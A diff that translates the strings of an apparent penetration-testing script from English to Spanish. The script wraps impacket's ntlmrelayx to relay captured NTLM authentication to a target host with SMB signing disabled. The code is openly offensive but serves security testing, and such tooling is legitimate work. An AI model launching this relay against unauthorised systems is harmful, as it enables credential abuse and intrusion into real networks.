@@ -1,9 +1,9 @@
 
 # scripts/smb/attack/ntlm_relay.py
 """
-NTLM relay setup helper.
-Launches impacket ntlmrelayx.py targeting the specified host.
-Lobera acts as a launcher/wrapper, not as the relay itself.
+Helper de configuración de NTLM relay.
+Lanza ntlmrelayx.py de impacket apuntando al host especificado.
+Lobera actúa como lanzador/wrapper, no como el relay en sí.
 """
 import subprocess
 import shutil
@@ -17,8 +17,8 @@ class Script(BaseScript):
     protocol    = "smb"
     category    = "attack"
     description = (
-        "Launch ntlmrelayx (impacket) to relay captured NTLM auth to a target. "
-        "Requires ntlmrelayx.py in PATH and SMB signing disabled on target."
+        "Lanza ntlmrelayx (impacket) para hacer relay de autenticación NTLM capturada a un objetivo. "
+        "Requiere ntlmrelayx.py en el PATH y SMB signing deshabilitado en el objetivo."
     )
 
     def run(self, **kwargs):
@@ -29,24 +29,24 @@ class Script(BaseScript):
 
         ntlmrelayx = shutil.which("ntlmrelayx.py") or shutil.which("ntlmrelayx")
         if not ntlmrelayx:
-            console.print("[red]ntlmrelayx.py not found in PATH.[/red]")
-            console.print("[dim]Install impacket: pip install impacket[/dim]")
+            console.print("[red]ntlmrelayx.py no encontrado en el PATH.[/red]")
+            console.print("[dim]Instala impacket: pip install impacket[/dim]")
             return None
 
         cmd = [ntlmrelayx, "-t", f"{mode}://{relay_target}", "-smb2support"]
         if extra_args:
             cmd += extra_args.split()
 
-        console.print(f"\n[bold green]Launching:[/bold green] {' '.join(cmd)}")
-        console.print("[dim]Press Ctrl+C to stop the relay.[/dim]\n")
+        console.print(f"\n[bold green]Lanzando:[/bold green] {' '.join(cmd)}")
+        console.print("[dim]Pulsa Ctrl+C para detener el relay.[/dim]\n")
 
         session_db.DB.SaveFinding(ip, "SMB", "ntlm_relay_launched",
                                    f"relay_target={relay_target} mode={mode}")
         try:
             subprocess.run(cmd)
         except KeyboardInterrupt:
-            console.print("\n[dim]Relay stopped.[/dim]")
+            console.print("\n[dim]Relay detenido.[/dim]")
         except Exception as e:
-            print_result("SMB", ip, "fail", f"ntlmrelayx failed: {e}")
+            print_result("SMB", ip, "fail", f"ntlmrelayx falló: {e}")
             return None
         return True
